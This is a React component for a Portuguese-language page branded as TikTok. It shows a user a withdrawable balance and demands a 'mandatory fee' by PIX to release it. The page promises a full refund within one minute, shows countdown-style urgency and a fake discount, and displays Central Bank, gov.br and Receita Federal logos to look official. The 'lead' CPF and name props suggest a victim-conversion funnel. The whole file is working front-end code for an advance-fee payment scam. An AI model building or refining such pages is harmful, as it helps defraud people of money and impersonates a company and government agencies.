import { useState, useEffect, useRef } from "react";
import { Check, Loader2, ShieldCheck, ChevronDown, Copy, CheckCircle2, Clock } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import bacenLogo from "@/assets/bacen-logo.png";
import govbrLogo from "@/assets/govbr-logo.webp";
import receitaFederalLogo from "@/assets/receita-federal-logo.png";
import pixLogoFull from "@/assets/pix-logo-full.svg";
import { PixPaymentData } from "./types";

const FaqItem = ({ question, answer }: { question: string; answer: string }) => {
  const [open, setOpen] = useState(false);
  return (
    <div className="border-b border-gray-100 last:border-0">
      <button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between py-3 text-left">
        <span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>
        <ChevronDown className={`w-4 h-4 text-gray-400 shrink-0 transition-transform ${open ? "rotate-180" : ""}`} />
      </button>
      {open && <p className="text-gray-500 text-[11px] leading-relaxed pb-3 -mt-1">{answer}</p>}
    </div>
  );
};

interface FunnelConfirmTaxProps {
  balance: string;
  pixKey: string;
  pixKeyType?: string;
  pixName?: string;
  onGeneratePix: () => void;
  isGenerating: boolean;
  taxAmount?: string;
  taxAnchor?: string;
  taxDiscount?: string;
  leadCpf?: string;
  leadName?: string;
  pixData?: PixPaymentData | null;
  onCopyPix?: () => void;
  isPixCopied?: boolean;
  onManualCheck?: () => void;
  isCheckingPayment?: boolean;
  checkError?: string | null;
}

const FunnelConfirmTax = ({
  balance, pixKey, pixKeyType = "E-mail", pixName, onGeneratePix, isGenerating,
  taxAmount = "R$ 34,71", taxAnchor = "R$ 89,90", taxDiscount = "61% OFF", leadCpf, leadName,
  pixData, onCopyPix, isPixCopied, onManualCheck, isCheckingPayment, checkError,
}: FunnelConfirmTaxProps) => {
  const pixSectionRef = useRef<HTMLDivElement>(null);
  const hasScrolledRef = useRef(false);

  const maskCpf = (cpf: string) => {
    const digits = cpf.replace(/\D/g, '');
    if (digits.length >= 11) return `***.${digits.slice(3, 6)}.${digits.slice(6, 9)}-**`;
    return cpf;
  };

  useEffect(() => {
    if (pixData?.pix_code && pixSectionRef.current && !hasScrolledRef.current) {
      hasScrolledRef.current = true;
      setTimeout(() => {
        pixSectionRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    }
  }, [pixData?.pix_code]);

  const showPixInline = !!pixData?.pix_code;

  return (
    <div className="fixed inset-0 z-[80] bg-[#F8F8F8] overflow-y-auto">
      <div className="py-3 flex justify-center bg-white border-b border-gray-100">
        <img src={tiktokLogo} alt="TikTok" className="h-6 w-auto" />
      </div>

      <main className="px-3 py-2.5 space-y-2.5 max-w-md mx-auto pb-6">
        <div className="bg-black rounded-xl p-4">
          <p className="text-white/90 text-[10px] font-semibold tracking-wider mb-0.5">SALDO DISPONÍVEL</p>
          <p className="text-white text-[26px] font-extrabold tracking-tight leading-none">{balance}</p>
          <p className="text-white/80 text-xs mt-1.5">Aguardando confirmação para saque</p>
        </div>

        <div className="bg-white rounded-xl p-4 border border-gray-100">
          <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-3">CONFIRMAÇÃO DE IDENTIDADE</p>
          {leadCpf && (
            <div className="flex items-center gap-3 mb-3 bg-gray-50 rounded-lg px-3 py-2.5">
              <div className="w-8 h-8 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div>
              <div className="flex-1 min-w-0">
                <p className="text-gray-800 text-xs font-semibold truncate">{leadName || "Titular"}</p>
                <p className="text-gray-400 text-[11px]">CPF: {maskCpf(leadCpf)}</p>
              </div>
              <Check className="w-4 h-4 text-[#4CAF50] shrink-0" />
            </div>
          )}
          <div className="flex items-center gap-2.5 mb-3">
            <div className="flex items-baseline gap-2">
              <span className="text-gray-400 text-sm line-through">{taxAnchor}</span>
              <span className="text-[#E53935] text-xl font-bold leading-none">{taxAmount}</span>
            </div>
            <span className="bg-[#E8F5E9] text-[#4CAF50] text-[10px] font-semibold px-2 py-1 rounded">{taxDiscount}</span>
          </div>
          <div className="bg-[#FFF3E0] border border-orange-200 rounded-lg px-3 py-2 mb-3">
            <p className="text-orange-800 text-[11px] font-semibold">🔥 Promoção por tempo limitado</p>
          </div>
          <p className="text-gray-500 text-xs leading-relaxed">
            Taxa obrigatória para liberação do saque no valor de <span className="font-bold text-gray-800">{balance}</span>. O valor de <span className="font-bold text-gray-800">{taxAmount}</span> será reembolsado integralmente para você em 1 minuto.
          </p>
        </div>

        <div className="bg-[#E8F5E9] rounded-xl px-4 py-3 border border-[#C8E6C9] flex items-center gap-3">
          <div className="w-8 h-8 rounded-full bg-[#4CAF50] flex items-center justify-center shrink-0"><ShieldCheck className="w-4 h-4 text-white" /></div>
          <div>
            <p className="text-[#2E7D32] text-xs font-bold">Reembolso garantido em 1 minuto</p>
            <p className="text-[#388E3C] text-[11px]">Você recebe {taxAmount} de volta automaticamente via PIX</p>
          </div>
        </div>

        {!showPixInline && (
          <div className="bg-white rounded-xl p-4 border border-gray-100">
            <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-4">PROCESSO DE LIBERAÇÃO</p>
            <div className="space-y-4">
              <div className="flex items-start gap-3">
                <div className="w-7 h-7 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-[#E57373] text-xs font-semibold">1</span></div>
                <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Pagar taxa de confirmação</p><p className="text-gray-400 text-[11px] mt-0.5">{taxAmount} para verificação de identidade</p></div>
              </div>
              <div className="flex items-start gap-3">
                <div className="w-7 h-7 rounded-full bg-[#E8F5E9] flex items-center justify-center shrink-0"><Check className="w-3.5 h-3.5 text-[#4CAF50]" /></div>
                <div className="pt-0.5"><p className="text-[#4CAF50] text-[13px] font-semibold leading-tight">Receber reembolso automático</p><p className="text-gray-400 text-[11px] mt-0.5">Valor devolvido em 1 minuto</p></div>
              </div>
              <div className="flex items-start gap-3">
                <div className="w-7 h-7 rounded-full bg-gray-100 flex items-center justify-center shrink-0"><span className="text-gray-400 text-xs font-semibold">3</span></div>
                <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Acessar saldo completo</p><p className="text-gray-400 text-[11px] mt-0.5">{balance} liberado para saque</p></div>
              </div>
            </div>
          </div>
        )}

        <button
          onClick={onGeneratePix}
          disabled={isGenerating || showPixInline}
          className={`w-full font-bold text-base py-4 rounded-xl flex items-center justify-center gap-2 transition-all active:scale-95 ${
            showPixInline
              ? 'bg-gray-300 text-gray-500 cursor-not-allowed shadow-none'
              : 'bg-[#00A651] text-white shadow-lg shadow-green-500/40 animate-[pulse_2s_cubic-bezier(0.4,0,0.6,1)_infinite]'
          }`}
        >
          {isGenerating ? <Loader2 className="w-5 h-5 animate-spin" /> : showPixInline ? "✓ PIX gerado abaixo" : "LIBERAR SAQUE"}
        </button>

        {/* ─── Seção PIX Inline ─── */}
        {showPixInline && pixData && (
          <div ref={pixSectionRef} className="bg-white rounded-xl border-2 border-[#E8505B] overflow-hidden">
            <div className="bg-gradient-to-r from-[#E8505B] to-[#D32F2F] px-4 py-2.5 flex items-center justify-between">
              <img src={pixLogoFull} alt="PIX" className="h-5 brightness-0 invert" />
              <span className="text-white/90 text-[11px] font-medium">Pagamento via PIX</span>
            </div>

            <div className="p-4 space-y-3">
              <div className="bg-gray-50 rounded-lg p-2.5">
                <div className="flex items-center gap-2.5 justify-center">
                  {[{ n: "1", t: "Abra seu banco" }, { n: "2", t: "PIX Copia e Cola" }, { n: "3", t: "Cole e pague" }].map(s => (
                    <div key={s.n} className="flex items-center gap-1">
                      <div className="w-5 h-5 rounded-full bg-[#E8505B] flex items-center justify-center shrink-0"><span className="text-white text-[9px] font-bold">{s.n}</span></div>
                      <p className="text-gray-600 text-[10px]">{s.t}</p>
                    </div>
                  ))}
                </div>
              </div>

              <div className="text-center">
                <div className="w-40 h-40 mx-auto mb-2 bg-white p-2 border-2 border-gray-200 rounded-xl flex items-center justify-center shadow-sm">
                  <QRCodeSVG value={pixData.pix_code!} size={144} level="M" />
                </div>
                <p className="text-xl font-bold text-gray-800">{taxAmount}</p>
                <p className="text-gray-400 text-xs">Taxa de Confirmação</p>
              </div>

              <div className="bg-amber-50 border border-amber-200 rounded-lg p-2.5 flex items-center justify-center gap-2">
                <div className="w-2 h-2 bg-amber-500 animate-pulse rounded-full" />
                <span className="text-amber-700 text-xs font-medium">Aguardando pagamento...</span>
              </div>

              <div className="bg-gray-50 rounded-lg p-2.5">
                <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-1.5">CÓDIGO PIX COPIA E COLA</p>
                <p className="text-gray-600 text-[9px] break-all font-mono leading-relaxed">{pixData.pix_code}</p>
              </div>

              <button
                onClick={onCopyPix}
                className="w-full py-3.5 rounded-xl bg-[#2A9D5C] text-white font-bold text-sm transition-all active:scale-[0.98] flex items-center justify-center gap-2 shadow-lg hover:brightness-105"
                style={{ animation: isPixCopied ? "none" : "pulse 2s cubic-bezier(0.4,0,0.6,1) infinite" }}
              >
                {isPixCopied ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                {isPixCopied ? '✓ Código copiado! Cole no seu banco' : 'Copiar código PIX'}
              </button>

              {isPixCopied && (
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-2.5 text-center -mt-1">
                  <p className="text-blue-700 text-[11px] font-medium">📋 Agora abra o app do seu banco → PIX → Pix Copia e Cola → Cole o código</p>
                </div>
              )}

              {onManualCheck && (
                <button
                  onClick={onManualCheck}
                  disabled={isCheckingPayment}
                  className="w-full py-3 rounded-xl bg-[#1A6FC4] text-white font-semibold text-sm hover:brightness-105 transition-all active:scale-[0.98] flex items-center justify-center gap-2 disabled:opacity-70"
                >
                  {isCheckingPayment ? (<><Loader2 className="w-4 h-4 animate-spin" />Verificando...</>) : (<><CheckCircle2 className="w-4 h-4" />Já paguei</>)}
                </button>
              )}

              {checkError && (
                <div className="bg-red-50 border border-red-200 rounded-lg p-2.5 text-center">
                  <span className="text-red-600 text-xs">{checkError}</span>
                </div>
              )}

              <div className="flex items-center justify-center gap-2 pt-1">
                <Clock className="w-3.5 h-3.5 text-[#4CAF50]" />
                <span className="text-[#4CAF50] text-[11px] font-medium">Reembolso automático em 1 minuto</span>
              </div>
            </div>
          </div>
        )}

        <div className="bg-white rounded-xl p-4 border border-gray-100">
          <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-3">PERGUNTAS FREQUENTES</p>
          <div className="space-y-0">
            {[
              { q: "Por que preciso pagar essa taxa?", a: "A taxa é uma verificação de segurança obrigatória para confirmar sua identidade e liberar o saque. O valor é reembolsado automaticamente em até 1 minuto." },
              { q: "Vou receber o reembolso da taxa?", a: "Sim! O reembolso é 100% automático via PIX. Você recebe de volta o valor integral em até 1 minuto após o pagamento." },
              { q: "Quanto tempo para o saque cair?", a: "Após a confirmação, o saque é processado e enviado para sua chave PIX em poucos minutos." },
              { q: "É seguro pagar via PIX?", a: "Sim. O PIX é regulamentado pelo Banco Central do Brasil e todas as transações são criptografadas e protegidas." },
              { q: "E se eu não receber o reembolso?", a: "O reembolso é automático e garantido. Caso não receba em até 5 minutos, entre em contato pelo suporte que resolveremos imediatamente." },
            ].map((item, i) => <FaqItem key={i} question={item.q} answer={item.a} />)}
          </div>
        </div>

        <div className="flex items-center justify-center gap-5 py-3">
          <img src={bacenLogo} alt="BACEN" className="h-10 object-contain" />
          <img src={govbrLogo} alt="gov.br" className="h-6 object-contain" />
          <img src={receitaFederalLogo} alt="Receita Federal" className="h-10 object-contain" />
        </div>

        <div className="text-center pb-4">
          <p className="text-gray-400 text-xs mb-1.5">Processo 100% seguro</p>
          <a href="#" className="text-[#E8505B] text-xs font-medium">Precisa de ajuda?</a>
        </div>
      </main>
    </div>
  );
};

export default FunnelConfirmTax;
